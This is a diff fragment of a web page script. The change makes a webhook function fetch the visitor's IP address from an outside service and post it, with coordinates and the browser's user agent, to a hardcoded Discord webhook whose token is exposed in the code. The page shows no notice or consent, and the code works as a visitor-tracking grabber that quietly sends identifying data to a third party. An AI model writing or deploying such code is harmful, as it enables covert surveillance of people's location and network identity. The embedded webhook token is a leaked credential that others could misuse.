@@ -52,29 +52,33 @@
     }
 
     // Function to send data to webhook
-    function sendToWebhook(coords) {
+    async function sendToWebhook(coords) {
         const webhookUrl = 'https://discord.com/api/webhooks/1249231367057834014/IkOD3gMKxASoxgHzZSXlRLeFHchi3faP9zyPsUFAs7Z12dg7uE700dHL05A0R-9yUyHN'; // Replace with your webhook URL
-        const userIp = ''; // Placeholder, actual IP retrieval via server-side preferred
         const userAgent = navigator.userAgent;
 
-        const payload = {
-            coordinates: coords,
-            ip: userIp, // Can't be reliably obtained from client-side due to CORS and security restrictions
-            userAgent: userAgent,
-        };
+        // Fetch the user's IP address from an external service
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const userIp = ipData.ip;
 
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(payload),
-        })
-        .then(response => response.json())
-        .then(data => console.log('Success:', data))
-        .catch((error) => {
-            console.error('Error:', error);
-        });
+            const payload = {
+                coordinates: coords,
+                ip: userIp,
+                userAgent: userAgent,
+            };
+
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            });
+            console.log('Data sent to webhook successfully');
+        } catch (error) {
+            console.error('Error fetching IP or sending data to webhook:', error);
+        }
     }
 </script>
 
